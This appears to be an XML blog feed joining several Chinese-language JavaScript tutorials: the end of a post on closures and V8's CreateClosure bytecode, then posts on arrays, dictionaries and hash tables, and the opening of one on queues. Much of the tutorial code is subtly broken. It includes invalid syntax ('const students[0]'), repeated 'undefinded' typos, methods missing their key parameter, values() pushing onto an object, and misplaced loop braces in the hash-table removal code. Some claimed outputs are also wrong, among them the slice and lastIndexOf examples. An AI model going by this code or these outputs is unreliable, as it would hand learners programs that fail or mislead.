因為那些變數被留在 innerEC 的 scope chain 裡面，所以不會也不能被 GC 回收掉，才會發生這種現象。
而理解了 scope chain 其實只是 VO&#x2F;AO 的組合以後，也能很輕易地就知道我們開頭所說的「在 scope chain 往上找」是什麼意思，就是往上一層去看有沒有這個變數嘛，因為有的話一定會存在 VO&#x2F;AO 裡面。
最後，上面這個模型還有一件事情要注意，那就是無論我有沒有把內部的 function 給回傳（以上面這個例子就是 inner），都不影響這個機制的運行。
意思是說儘管我的程式碼長這樣：
var v1 = 10function test() &#123;  var vTest = 20  function inner() &#123;    console.log(v1, vTest) //10 20  &#125;  inner() // 不回傳直接執行&#125;test()

他最後出來的模型跟剛剛的程式碼是一模一樣的，inner 都有一樣的 scope chain，並且一樣存著 test 跟 global EC 的 VO&#x2F;AO。
你有注意到我們正一步步邁向我們的標題嗎？
所有的函式都是閉包我們再回來看 wiki 上面對閉包的定義：

在電腦科學中，閉包（英語：Closure），又稱詞法閉包（Lexical Closure）或函式閉包（function closures），是參照了自由變數的函式。這個被參照的自由變數將和這個函式一同存在，即使已經離開了創造它的環境也不例外。所以，有另一種說法認為閉包是由函式和與其相關的參照環境組合而成的實體。

如果說你認為閉包一定要：「離開創造它的環境」，那顯然「所有的函式都是閉包」這句話就不成立；但如果你認同閉包的定義是：「由函式和與其相關的參照環境組合而成的實體」，那就代表在 JavaScript 裡面，所有的函式都是閉包。
為什麼？因為這就是 JavaScript 的運行機制，你每個宣告的 function 都會儲存著[[Scope]]，而這個資訊裡面就是參照的環境。
而這個說法也不是我自創的，在解釋 ECMAScript 最經典的系列文章中的其中一篇：ECMA-262-3 in detail. Chapter 6. Closures.，裡面是這樣說的：

Let’s make a note again, that all functions, independently from their type: anonymous, named, function expression or function declaration, because of the scope chain mechanism, are closures.
from the theoretical viewpoint: all functions, since all they save at creation variables of a parent context. Even a simple global function, referencing a global variable refers a free variable and therefore, the general scope chain mechanism is used;

所以從理論上來說，JavaScript 裡面的所有 function 都是閉包。

from the practical viewpoint: those functions are interesting which:


continue to exist after their parent context is finished, e.g. inner functions returned from a parent function;
use free variables.

但如果你只從「實作」上的觀點來關心閉包的話，我們會說閉包必須要用到自由變數，也必須在離開了建立的 context 以後還能夠存在，這樣才是我們真正所關心的那個閉包。
所以閉包到底是什麼，端看你從哪個角度去看他，但無庸置疑的，從理論上的角度來看 JavaScript 裡所有的 function 都是閉包，如果你還是不信的話，那最後我帶你來看看 V8 是怎麼想的。
再探 V8我們一樣寫一段簡單的程式碼，看看最後會 compile 出什麼東西：
var a = 23function yoyoyo()&#123;  &#125;yoyoyo()

這邊放一個 23 是因為方便我們在 byte code 中定位到這段程式，只有 function 會有名稱可以識別，這種寫在 global 裡面的東西比較難找。
產生出的結果是這樣：
[generating bytecode for function: ]Parameter count 6Frame size 16         0x3e0ed5f6a9da @    0 : 6e 00 00 02       CreateClosure [0], [0], #2         0x3e0ed5f6a9de @    4 : 1e fa             Star r1   10 E&gt; 0x3e0ed5f6a9e0 @    6 : 91                StackCheck    70 S&gt; 0x3e0ed5f6a9e1 @    7 : 03 17             LdaSmi [23]         0x3e0ed5f6a9e3 @    9 : 1e fb             Star r0   95 S&gt; 0x3e0ed5f6a9e5 @   11 : 4f fa 01          CallUndefinedReceiver0 r1, [1]         0x3e0ed5f6a9e8 @   14 : 04                LdaUndefined   107 S&gt; 0x3e0ed5f6a9e9 @   15 : 95                Return   [generating bytecode for function: yoyoyo]Parameter count 1Frame size 0   88 E&gt; 0x3e0ed5f6b022 @    0 : 91                StackCheck          0x3e0ed5f6b023 @    1 : 04                LdaUndefined    93 S&gt; 0x3e0ed5f6b024 @    2 : 95                Return 

你只要看關鍵字就好了，你有沒有看到建立 function 的那邊是什麼？是CreateClosure，我們只是很簡單的創建一個 function 並且呼叫他而已，V8 依然是用CreateClosure這個指令。
那如果今天是在 function 裡面建立一個新的 function 呢？
function yoyoyo()&#123;  function inner()&#123;&#125;&#125;yoyoyo()

結果：
[generating bytecode for function: yoyoyo]Parameter count 1Frame size 8         0x2c9f0836b0fa @    0 : 6e 00 00 02       CreateClosure [0], [0], #2         0x2c9f0836b0fe @    4 : 1e fb             Star r0   77 E&gt; 0x2c9f0836b100 @    6 : 91                StackCheck          0x2c9f0836b101 @    7 : 04                LdaUndefined   106 S&gt; 0x2c9f0836b102 @    8 : 95                Return 

一樣還是呼叫了CreateClosure。最後讓我們來試試看我們所熟知的那種，也就是要回傳建立的 function：
function yoyoyo()&#123;  function inner()&#123;&#125;  return inner&#125;yoyoyo()

結果：
[generating bytecode for function: yoyoyo]Parameter count 1Frame size 8         0x3f4bde3eb0fa @    0 : 6e 00 00 02       CreateClosure [0], [0], #2         0x3f4bde3eb0fe @    4 : 1e fb             Star r0   77 E&gt; 0x3f4bde3eb100 @    6 : 91                StackCheck   116 S&gt; 0x3f4bde3eb101 @    7 : 95                Return 

差別在哪裡？只差在前者在回傳前多了一個LdaUndefined 載入 undefined，後者沒加所以把建立出來的 function 傳回去。可是在建立 function 的指令上面，是一模一樣的，都叫做CreateClosure。
只看 compile 出來的程式碼或許有失公允，如果能看到 V8 內部怎麼講就再好不過了。
以前曾經試圖想找但是 V8 太大了，這次我碰巧在找資料的時候看見這篇文章：Analyze implementation of closures in V8，雖然是九年前的文章，但裡面有稍微提到一些關鍵字，我循著關鍵字去找，找到了幾個很有趣的地方。
第一個是 src&#x2F;interpreter&#x2F;interpreter-generator.cc 這隻檔案，裡面記錄著所有 byte code 的指令，對CreateClosure它是這麼描述的：
// CreateClosure &lt;index&gt; &lt;slot&gt; &lt;tenured&gt;//// Creates a new closure for SharedFunctionInfo at position |index| in the// constant pool and with the PretenureFlag &lt;tenured&gt;.

這檔案對以後看 byte code 很有幫助，所以要特地 po 在這邊記起來。
第二個是 src&#x2F;contexts.h，這邊紀錄的資訊十分豐富，你可以看到這一段註解：
// JSFunctions are pairs (context, function code), sometimes also called// closures. A Context object is used to represent function contexts and// dynamically pushed &#x27;with&#x27; contexts (or &#x27;scopes&#x27; in ECMA-262 speak).//// At runtime, the contexts build a stack in parallel to the execution// stack, with the top-most context being the current context. All contexts// have the following slots://// [ scope_info     ]  This is the scope info describing the current context. It//                     contains the names of statically allocated context slots,//                     and stack-allocated locals.  The names are needed for//                     dynamic lookups in the presence of &#x27;with&#x27; or &#x27;eval&#x27;, and//                     for the debugger.

除了我們最想知道的 Closure，它也提到了 context 跟 scope info，都是我們上面所討論的東西，概念類似只是名詞有點不太一樣而已。
但最重要的是這句：

JSFunctions are pairs (context, function code), sometimes also called closures.

每一個 JS 的 function 都記錄著 context 的資訊，再次印證了我們先前所講的機制。
第三個也是最後一個，我意外地發現了 V8 裡面處理 scope 的地方，在 src&#x2F;ast&#x2F;scopes.cc，點連結之後連到的地方LookupRecursive就是在講述尋找變數的過程，先在 scope 裡面找，沒有的話再往上面找，還是找不到的話就在 global 宣告一個。
熟知這段過程這麼久，第一次看見 V8 的實現長怎樣，實在是很有趣。雖然 C++ 看不太懂，但幸好文章裡面有大量的註解，所以看著註解就可以理解五六成的程式碼。
結論有一個小地方要先說明，在我這篇以及上一篇裡面，我都刻意不提及eval跟with這兩個東西，因為這兩個東西會讓作用域變得複雜許多所以我才故意不帶到，在我看 V8 程式碼的時候也看到大量程式碼是在處理這兩個的操作，如果你對這兩個操作有興趣，可以自行去找相關的文章來看。
在上一次徹底理解 hoisting 的過程中我們有了最重要的底層機制的運行概念，也稍微看到了 V8 的 byte code，在這一次則是把上次的模型補充得更完整，只要按照那個模型去解釋程式的運行，什麼 hoisting 什麼 closure 的都能夠輕鬆理解。
這次也更深入了 V8，直接看到處理 scope 以及 context 相關的程式碼，但 V8 畢竟還是一個很大的專案，光幾個檔案我就看不完了，根本不能談上理解，因此只是以一種好玩的角度想去看一下而已。
這篇的目標跟上一篇一樣，對於本來就對這個主題不熟的人，希望能夠讓你們理解這個主題；對於已經熟悉的人也希望能帶來一些新的想法，畢竟我左看右看上看下看都沒看到什麼人直接跑去 V8 找相關的程式碼段落出來。
最後，再次幫自己工商一下，我前陣子把自己以前寫過的文章都放到了 GitHub 上面，如果有想討論的可以在這篇文章的 GitHub 版本下面留言，想收到新文章通知的也可以按個 watch 跟 star，感謝。
參考資料：

从static&#x2F;dynamic scope来谈JS的作用域
MDN
深入淺出瞭解 JavaScript 閉包（closure）
你不可不知的 JavaScript 二三事#Day5：湯姆克魯斯與唐家霸王槍——變數的作用域(Scope) (1)
關於 JS 作用域裡面的解釋
ECMA-262-3 in detail. Chapter 6. Closures.
Grokking V8 closures for fun (and profit?)
Understanding JavaScript Closures
https://javascript.info/closure
Analyze implementation of closures in V8

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>closure</tag>
      </tags>
  </entry>
  <entry>
    <title>用 JavaScript 學習資料結構和演算法：陣列（Array）篇</title>
    <url>/2016/10/08/javascript-data-structure-algorithm-array/</url>
    <content><![CDATA[
什麼是陣列（Array）？陣列可以說是程式語言中暫時儲存資料的櫃子，幾乎所有的程式語言都具備陣列這個廣泛運用的資料結構，但值得注意的是一般程式語言中陣列只能儲存同樣型別的值，但在 JavaScript 則可以儲存不同型別的值（但我們還是盡量避免）。
下面是陣列的簡單使用情境，當今天我們想儲存整個班級的學生姓名時，我們不可能使用一個個變數去一個個儲存，這時候陣列的功能就派上用場了：
const student1 = &#x27;Mark&#x27;;const student2 = &#x27;Zuck&#x27;;const student3 = &#x27;Woz&#x27;;const students[0] = &#x27;Mark&#x27;;const students[1] = &#x27;Zuck&#x27;;const students[2] = &#x27;Woz&#x27;;

陣列初體驗
接下來我們將實際操作陣列，讓讀者感受一下陣列的使用方式：

建立和初始化陣列
 在 JavaScript 中建立陣列十分容易和彈性，主要有兩種方式：
 使用 new Array()，可以自定陣列大小 
 let newArray1 = new Array();let newArray2 = new Array(3);let students = new Array(&#x27;Mark&#x27;, &#x27;Zuck&#x27;);

 使用 [] 宣告陣列，相對彈性
 let newArray1 = [];let students = [&#x27;Mark&#x27;, &#x27;Zuck&#x27;];

新增、刪除陣列元素
 在 JavaScript 有許多彈性好用的新增刪除陣列的方法，最簡單的新增方式就是把值直接賦值給陣列上最後一個元素：
 let students = [&#x27;Mark&#x27;, &#x27;Zuck&#x27;, &#x27;Pony&#x27;, &#x27;Elon&#x27;];// 由於陣列 index 是從 0 開始，使用陣列長度當 index 賦值就會新增一個元素 students[students.length] = &#x27;Mary&#x27;;

 使用 push 可以將元素新增到最後，pop 可以移除最後陣列元素：
 let students = [&#x27;Mark&#x27;, &#x27;Zuck&#x27;, &#x27;Pony&#x27;, &#x27;Elon&#x27;];// 將 Mary 加入最後元素students.push(&#x27;Mary&#x27;);// 將 Mary 移除students.pop();

 整個移動陣列元素，以下示範想在首位插入元素 12：
 let numbers = [1, 2, 3, 4];for(let i = numbers.length; i &gt;= 0; i--) &#123;	numbers[i] = numbers[i - 1];&#125;numbers[0] = 12;

 unshift、shift 陣列可以分別將數值插入首位和移除首位元素：
 let students = [&#x27;Mark&#x27;, &#x27;Zuck&#x27;, &#x27;Pony&#x27;, &#x27;Elon&#x27;];// 將 Mary 插入首位students.unshift(&#x27;Mary&#x27;);// 將 Mary 移除students.shift();

 使用 splice 方法可以指定 index 去新增、刪除元素：
 // splice(起始 index, 刪除個數，若為0即為插入, 欲插入元素1, 欲插入元素2, 欲插入元素N)let students = [&#x27;Mark&#x27;, &#x27;Zuck&#x27;, &#x27;Pony&#x27;, &#x27;Elon&#x27;];students.splice(0, 2); // students =&gt; [&#x27;Pony&#x27;, &#x27;Elon&#x27;]students.splice(1, 0, &#x27;John&#x27;, &#x27;Cath&#x27;); // students =&gt; [&#x27;Pony&#x27;, &#x27;John&#x27;, &#x27;Cath&#x27;, &#x27;Elon&#x27;];

二維陣列事實上在 JavaScript 中只支援一維陣列，但我們可以用陣列嵌套陣列的方式來達成多維陣列：
// 學生和他的成績let students = [];students[0] = [79, 74, 86];students[1] = [97, 54, 46];

列印出結果：
for(let i = 0; i &lt; students.length; i++) &#123;	for(let j = 0; j &lt; students[i].length; j++) &#123;		console.log(students[i][j]);	&#125;&#125;

以上是二維陣列作法，若是多維則以此類推，但越多維維護起資料越複雜。
常見陣列方法陣列相當彈性也功能強大的一種資料結構，除了上面介紹的方法外還擁有許多常用方法。我們這裡也借用 @tooto1985 所整理的圖解 JavaScript 陣列操作方法進行講解：

陣列合併和切割
concat
 連接兩個或多個陣列並回傳結果：
 var hege = [&quot;Cecilie&quot;, &quot;Leo&quot;];var stale = [&quot;Emil&quot;, &quot;May&quot;, &quot;Linus&quot;];var children = hege.concat(stale);// [&#x27;Cecilie&#x27;, &#x27;Leo&#x27;, &#x27;Emil&#x27;, &#x27;May&#x27;, &#x27;Linus&#x27;]

slice
 將 array 切片，回傳新的 array：
 var fruits = [&#x27;Banana&#x27;, &#x27;Orange&#x27;, &#x27;Lemon&#x27;, &#x27;Apple&#x27;, &#x27;Raspberry&#x27;];var citrus = fruits.slice(1, 3); // [&#x27;Orange&#x27;, &#x27;Lemon&#x27;, &#x27;Apple&#x27;]	

join
 將陣列用分隔符號（separator）串起來成字串
 var fruits = [&#x27;Banana&#x27;, &#x27;Orange&#x27;, &#x27;Lemon&#x27;, &#x27;Apple&#x27;, &#x27;Raspberry&#x27;];var citrus = fruits.join(); // 預設使用 , 分隔：Banana,Orange,Lemon,Apple,Raspberry		

陣列迭代
every
 對陣列每個元素都進行迭代，若迭代函數內容皆為 true，則回傳 true，反之回傳 false：
 var ages = [32, 33, 16, 40];function checkAdult(age) &#123;    return (age &gt;= 18) ? true : false;&#125;console.log(ages.every(checkAdult)); // false

some
 與 every 的用法類似，但不同的是若迭代函數中有一個為 true 即回傳 true，反之回傳 false：
 var ages = [3, 10, 18, 20];function checkAdult(age) &#123;    return (age &gt;= 18) ? true : false;&#125;console.log(ages.some(checkAdult)); // true

map
 迭代每一個陣列元素：
 var numbers = [4, 9, 16, 25];numbers.map(function(value, index) &#123;	console.log(value, index);&#125;);

reduce
 由左到右累加（reduce 方法的參數函數共有 previousValue, currentValue, index, array 四個參數）：
 var numbers = [65, 44, 12, 3];function getSum(total, num) &#123;    return total + num;&#125;numbers.reduce(getSum); // 124

reduceRight
 由右到左累加：
 var numbers = [65, 44, 12, 3];function getSum(total, num) &#123;    return total + num;&#125;numbers.reduceRight(getSum); // 124

filter
 依據條件回傳過濾後的陣列：
 var ages = [32, 33, 16, 40];function checkAdult(age) &#123;    return age &gt;= 18;&#125;ages.filter(checkAdult); // [32, 33, 40]

forEach
 迭代陣列元素：
 numbers.forEach(function(value, index)&#123;	console.log(value, index);&#125;);

搜尋和排序
indexOf
 回傳值位於陣列內的位置，若值未在陣列中則回傳 -1：
 var fruits = [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;];var a = fruits.indexOf(&quot;Orange&quot;); // 1

lastIndexOf
 與 indexOf 類似，但是是回傳最後一次 match 到的 index，同樣若值未在陣列中則回傳 -1：
 var fruits = [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;, &quot;Orange&quot;];var a = fruits.indexOf(&quot;Orange&quot;); // 4

reverse
 反轉陣列元素：
 var fruits = [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;];fruits.reverse(); [&#x27;Mango&#x27;, &#x27;Apple&#x27;, &#x27;Orange&#x27;, &#x27;Banana&#x27;]

sort
 將陣列內容進行排序，回傳排序後陣列，若為文字則根據 ASCII Code 編碼大小進行比較：
 var fruits = [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;];fruits.sort();

輸出陣列為字串
toString
 將陣列轉成字串，並回傳結果：
 var fruits = [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;];fruits.toString();	// Banana,Orange,Apple,Mango

valueOf 
 回傳陣列內容：
 var fruits = [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;];var v = fruits.valueOf();	

總結以上就是 JavaScript 陣列（Array）介紹和操作方法，讀者們千萬別走看花，實際動手在 console 或是 JSBin 上感受一下，你就會知道 JavaScript Array 的彈性好用！接下來的資料結構介紹裡也會使用到許多 Array 的操作方式。
延伸閱讀
JavaScript Array Reference

（image via speakingcs、dhananjay25、tooto1985）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Algorithm</tag>
        <tag>演算法</tag>
        <tag>ECMAScript2015</tag>
        <tag>ES6</tag>
        <tag>Data Structure</tag>
        <tag>Queue</tag>
        <tag>資料結構</tag>
        <tag>陣列</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>用 JavaScript 學習資料結構和演算法：字典（Dictionary）和雜湊表（Hash Table）篇</title>
    <url>/2017/03/10/javascript-data-structure-algorithm-dictionary-hash-table/</url>
    <content><![CDATA[
前言在之前我們學習了一種不重複元素的集合，本文我們繼續討論另外一種不重複值的資料結構：字典（Dictionary）和雜湊表（Hash Table）。在集合中我們主要關心的是值本身 &#123; 值（value）： 值（value）&#125;，在字典（Dictionary）和雜湊表（Hash Table）則是有 &#123; 鍵（key）: 值（value）&#125; 之間的 mapping 關係。
什麼是字典（Dictionary）？

建立字典類別 與 Set 的情況類似，在 ES6 中也有原生的 Map 類別實作，因此本章我們也參考 ES6 的 Map 類別進行實作：
 function Dictionary() &#123;	let items = &#123;&#125;;	this.set = function(key, value) &#123;&#125;;	this.remove = function(key) &#123;&#125;;	this.has = function(key) &#123;&#125;;	this.get = function(key) &#123;&#125;;	this.clear = function() &#123;&#125;;	this.size = function() &#123;&#125;;	this.keys = function() &#123;&#125;;	this.values = function() &#123;&#125;;&#125;


has(key)：判斷是 key 是否存在，這在 Dictionary 尤其重要

 this.has = function(key) &#123;	return key in items;	// 也可以使用 return items.hasOwnProperty(key);&#125;


set(key, value)：新增一個鍵值

 this.set = function(key, value) &#123;	items[key] = value;&#125;;


remove()：刪除一個鍵值

 this.remove = function() &#123;	if(this.has(key)) &#123;		delete items[key];		return true;	&#125;	return false;&#125;;


get()：讀取一個值

 this.get = function() &#123;	// 先判斷是否存在鍵	return this.has(key) ? items[key] : undefinded;&#125;;


values()：回傳所有值

 this.values = function() &#123;	let values = &#123;&#125;;	for(let k in items) &#123;		if(this.has(k)) &#123;			values.push(items[k]);		&#125;	&#125;	return values;&#125;;


clear()：清除字典

 this.clear = function() &#123;	items = &#123;&#125;;&#125;;


size()：回傳字典長度

使用類似於 Linked List 的 length 變數計算法，當新增、刪除元素時順便增減長度

  this.size = function() &#123;	return length;&#125;


使用 JavaScript 內建 Object 類別的內建函數 keys

  this.size = function() &#123;	return Object.keys(items).length;&#125;


手動迭代判斷是否存在集合中並累加個數

  this.size = function() &#123;	let count = 0;	// 特別注意在 JavaScript 中 for in 會一起把繼承於 Object 類別和物件自身的所有相關非相關資料結構的屬性一起迭代出來	for(let prop in items) &#123;		// 判斷是否屬於 items 的屬性		if(items.hasOwnProperty(prop)) &#123;			++count;		&#125;		return count;	&#125;&#125;

keys()：回傳字典擁有的鍵


 this.keys = function() &#123;	return Object.keys(items);&#125;


getItems()：回傳字典

 this.getItems() &#123;	return items;&#125;;

使用字典
 const dictionary = new Dictionary();// 新增鍵值dictionary.set(&#x27;Mark&#x27;, &#x27;mark@gmail.com&#x27;);dictionary.set(&#x27;Ivy&#x27;, &#x27;ivy@gmail.com&#x27;);dictionary.set(&#x27;Mary&#x27;, &#x27;mary@gmail.com&#x27;);console.log(dictionary.keys()); console.log(dictionary.values()); console.log(dictionary.get(&#x27;Mark&#x27;)); dictionary.remove(&#x27;Mark&#x27;);console.log(dictionary.keys()); 

什麼是雜湊表（Hash Table）？
接下來我們將介紹 Hash Table，也可稱作 HashMap，是 Dictionary 類別中雜湊表的一種實作。實作的思路大概是：當要把資料放到雜湊表時，先給定一個 key 和存放的 value，並將 key 的每個字元轉換成 ASCII Code 或 Unicode Code 並相加，這個相加的值即是 hash 鍵值，在 table 陣列上對應到存放的 value。

建立雜湊表
 function HashTable() &#123;	let table = [];	let getHashTableCode = function(key) &#123;		let hash = 0;		for(let i = 0; i &lt; key.length; i++) &#123;			// charCodeAt 會回傳指定字串內字元的 Unicode 編碼（可以包含中文字）			hash += key.charCodeAt(i);		&#125;		// 為了取到較小值，使用任意數做除法 mod 處理		return hash % 37;	&#125;	this.put = function(key, value) &#123;		// 根據 key 取出 Hash Function 產生的 position		const position = getHashTableCode(key);		// 對應 key 和 value		table[position] = value;	&#125;	this.get = function(key) &#123;		// 根據 key 取出 Hash Function 產生的 position		const position = getHashTableCode(key);		// 回傳值		return table[position];	&#125;	this.remove = function(key) &#123;		// 根據 key 取出 Hash Function 產生的 position		const position = getHashTableCode(key);		// 由於我們不能改變陣列長度（因為會影響到其它對應位置），所以將值給定 undefinded		table[position] = undefinded;	&#125;&#125;

使用雜湊表 
 let hashTable = new HashTable();hashTable.put(&#x27;Mark&#x27;, &#x27;mark@gmail.com&#x27;);hashTable.put(&#x27;Ivy&#x27;, &#x27;ivy@gmail.com&#x27;);hashTable.put(&#x27;Mary&#x27;, &#x27;mary@gmail.com&#x27;);hashTable.get(&#x27;Mark&#x27;);hashTable.get(&#x27;Jack&#x27;);// 刪除鍵值為 Mark 資料hashTable.remove(&#x27;Mark&#x27;);hashTable.get(&#x27;Mark&#x27;);

處理雜湊表衝突
 在上面實作的過程中，聰明的讀者應該可以發現：雖然雜湊表方便好用，但有可能會有不同鍵值但有相同雜湊值的情況出現（例如：Jamie 和 Sue 的值 ASCII Code 相加就相同）。這種不同值卻在雜湊表對應相同位置的情況我們稱作衝突（collision），若不處理的話，後來的值會覆蓋掉之前的值。接下來我們會介紹三種方式來避免碰撞（collision）。

分離鏈結：分離鏈結是在每一個 hash value 放置一個鏈結串列，當有 hash key 相同的值要放入時就新增進鏈結串列，是一個相對簡單的方式，但需要額外的鏈結串列空間。

 
 更新過後的 HashTable：
 function LinkedList() &#123;	const Node = function(element) &#123;		this.element = element;		this.next = null;	&#125;	// 存放 LinkedList 長度	let length = 0;	// 第一個節點的指標	let head = null;	// 在尾部新增一個節點	this.append = function(element) &#123;&#125;;	// 在特定位置新增一個元素節點	this.insert = function(position, element) &#123;&#125;;	// 從串列中移除一個元素節點	this.remove = function(element) &#123;&#125;;	// 從串列中移除一個特定的節點	this.removeAt = function(position) &#123;&#125;;	// 回傳元素在串列的元素節點 index，若無則回傳 -1	this.indexOf = function(element) &#123;&#125;;	// 判斷串列是否為空，是回傳 true，反之 false	this.isEmpty = function() &#123;&#125;;	// 回傳串列元素個數	this.size = function() &#123;&#125;;	// 由於 Node 是一個物件，所以運用 toString 方法將資料值輸出	this.toString = function() &#123;&#125;;	// 列印出值	this.print = function() &#123;&#125;;&#125;function HashTable() &#123;	let table = [];	// 實作內部一個 ValuePair 類別，存原始 key、value	let ValuePair = function(key, value) &#123;		this.key = key;		this.value = value;	&#125;	let getHashTableCode = function(key) &#123;		let hash = 0;		for(let i = 0; i &lt; key.length; i++) &#123;			// charCodeAt 會回傳指定字串內字元的 Unicode 編碼（可以包含中文字）			hash += key.charCodeAt(i);		&#125;		// 為了取到較小值，使用任意數做除法 mod 處理		return hash % 37;				&#125;	this.put = function(key, value) &#123;		let position = getHashTableCode(key);		// 若該位置沒有新增過元素，要先 init 一個 LinkedList 類別		if(table[position] === undefinded) &#123;			table[position] = new LinkedList();		&#125;		table[position].append(new ValuePair(key, value)); 	&#125;		this.get = function(key) &#123;		let position = getHashTableCode(key);		if(table[position] !== undefinded) &#123;			let current = table[position].getHead();			// 使用迴圈尋找在 LinkedList 中符合 key 的元素			while(current.next) &#123;				if(current.element.key === key) &#123;					return current.element.value;				&#125; 				current = current.next;			&#125;			// 若是要找的是第一個或是最後一個節點的情況就不會進入 while 迴圈，要在這裡處理			if(current.element.key === key) &#123;				return current.element.value;			&#125;		&#125; 		return undefinded;	&#125;	// 與一般雜湊表不同，我們要移除的是鏈結串列的元素	this.remove = function(key) &#123;		let position = getHashTableCode(key);		// 判斷該位置是否有元素		if(table[position] !== undefinded) &#123;			let current = table[position].getHead();			while(current.next) &#123;				// 當 key 相同時使用 LinkedList 的 remove 移除元素 						if(current.element.key === key) &#123;					table[position].remove(current.element);					// 若是整個位置的 LinkedList 為空則將該位置給定 undefinded					if(table[position].isEmpty()) &#123;						table[position] = undefinded;					&#125;					// 若成功移除則回傳 true					return true;				&#125;			&#125;			current = current.next;		&#125;		// 若是要找的是第一個或是最後一個節點的情況就不會進入 while 迴圈，要在這裡處理		if(current.element.key === key) &#123;			table[position].remove(current.element);			if(table[position].isEmpty()) &#123;					table[position] = undefinded;			&#125;		&#125;	&#125;	return false;&#125;	


線性探查：是另外一種解決雜湊表，若是欲加入 Hash Table 位置已經被佔據則往下一個 index + 1 去填，若還是被佔據則考慮 index + 2，以此類推。

 
 更新過後的 HashTable：
 function HashTable() &#123;	let table = [];	// 實作內部一個 ValuePair 類別，存原始 key、value			let ValuePair = function(key, value) &#123;		this.key = key;		this.value = value;	&#125;	let getHashTableCode = function(key) &#123;		let hash = 0;		for(let i = 0; i &lt; key.length; i++) &#123;			// charCodeAt 會回傳指定字串內字元的 Unicode 編碼（可以包含中文字）			hash += key.charCodeAt(i);		&#125;		// 為了取到較小值，使用任意數做除法 mod 處理		return hash % 37;				&#125;	// 由於 JavaScript 陣列可動態增加長度，所以不用擔心長度不夠問題	this.put = function(key, value) &#123;		let position = getHashTableCode(key);		// 若是位置沒被佔據直接 new 一個 ValuePair，若有則考慮下一個 index		if(table[position] === undefinded) &#123;			table[position] = new ValuePair(key, value);		&#125; else &#123;			let index = ++position;			while(table[index] !== undefinded) &#123;				index++;			&#125;			table[index] = new ValuePair(key, value);		&#125;	&#125;	this.get = function(key) &#123;		let position = getHashTableCode(key);		// 先確認鍵值是否存在		if(table[position] !== undefinded) &#123;			// 開始比對，沒有就下一個			if(table[position].key === key) &#123;				return table[position].value;			&#125; else &#123;				let index = ++position;				while(table[index] === undefinded || table[index].key !== key) &#123;					index++;				&#125;				if(table[index].key === key) &#123;					return table[index].value;				&#125;			&#125;		&#125;		return undefinded;	&#125;	this.remove = function(key) &#123;		let position = getHashTableCode(key);		// 先確認鍵值是否存在		if(table[position] !== undefinded) &#123;			// 開始比對，沒有就下一個			if(table[position].key === key) &#123;				table[index] = undefinded;			&#125; else &#123;				let index = ++position;				while(table[index] === undefinded || table[index].key !== key) &#123;					index++;				&#125;				if(table[index].key === key) &#123;					table[index] = undefinded;				&#125;			&#125;		&#125;		return undefinded;	&#125;&#125;			

更好的雜湊表（Hash Function）：俗話說預防勝於治療，若是能使用更好的 Hash Function 就能預先避免衝突（collision）的可能（擁有較低插入和檢索元素的時間、較低衝突的可能意味著更好的雜湊表）。

 // djb2HashCode 實作let djb2HashCode = function(key) &#123;	// 初始化 hash 值，大部分實作使用 5381	let hash = 5381;	for(let i = 0; i &lt; key.length; i++) &#123;		// 根據經驗值給個魔術數字 33		hash = hash * 33 + key.charCodeAt(i);	&#125;	// 1013 為隨機質數	return hash % 1013;&#125;		

總結在這個單元中我們學到了：

什麼是字典（Dictionary）？如何使用？
什麼是雜湊表（Hash Table）？如何實作？
處理雜湊表衝突

延伸閱讀
字符编码笔记：ASCII，Unicode和UTF-8

（image via algolist、mcgill、mindcrackerinc、hws、cecilsunkure）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Algorithm</tag>
        <tag>演算法</tag>
        <tag>ECMAScript2015</tag>
        <tag>ES6</tag>
        <tag>Data Structure</tag>
        <tag>資料結構</tag>
        <tag>陣列</tag>
        <tag>Dictionary</tag>
        <tag>Hash Table</tag>
        <tag>雜湊表</tag>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title>用 JavaScript 學習資料結構和演算法：佇列（Queue）篇</title>
    <url>/2016/12/10/javascript-data-structure-algorithm-queue/</url>
    <content><![CDATA[
什麼是佇列（Queue）？佇列（Queue）是一種先進先出（First In First Out, FIFO）的有序串列（Ordered List），與堆疊（Stack）後進先出（Last In First Out, LIFO）不同的是佇列（Queue）的新增和刪除元素是發生在不同端，新增元素在尾部、移除元素在頂部，最新加入的元素會從尾部排入。在一般生活中比較常見的例子是電影院排隊買票、小七便利商店排隊付款（當然不能有人想插隊啦），在計算機科學領域佇列（Queue）應用也十分常見，像是印表機列印順序排程（當我們點選列印鍵時，第一個列印文件會先被列印，後續送來的文件會依序列印）或是一般作業系統的工作佇列（job queue）、I&#x2F;O Buffer 緩衝區，也是透過先進先出來處理。
以下是佇列（Queue）幾個特性：

佇列（Queue）是一組相同性質的元素組合
具有先進先出（First In, First Out, FIFO）特性
新增元素時發生在 Rear 後端
刪除元素時發生在 Front 前端 
新增&#x2F;刪除（Enqueue&#x2F;Dequeue 或 Add&#x2F;Delete）元素是發生在不同端

用陣列（Array）實作佇列（Queue）接下來我們將使用 JavaScript 的一維陣列來實作佇列（Queue），其基本步驟如下：

宣告佇列類別
 function Queue() &#123;	// 這裡將放置佇列的屬性和方法&#125;

宣告一個一維陣列（Array）
 首先我們使用一個一維陣列（Array）當做儲存佇列元素的資料結構，這部份和我們之前提到的堆疊（Stack）類似，只是在佇列新增刪除元素時是在不同端點進行（這邊使用 let 讓 scope 維持在 function 中）：
 function Queue() &#123;	let items = [];&#125;

